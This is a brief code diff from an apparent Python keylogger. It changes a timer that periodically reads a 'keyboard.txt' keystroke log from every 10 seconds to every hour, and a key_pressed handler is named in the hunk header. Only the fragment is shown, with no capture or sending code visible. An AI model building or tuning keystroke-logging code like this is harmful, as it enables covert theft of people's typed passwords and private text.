@@ -58,7 +58,7 @@ def key_pressed(key):
 
 
 def timer():
-   t=Timer(10,timer)
+   t=Timer(3600,timer)
    t.start()
    try:
       f=open("keyboard.txt","r")
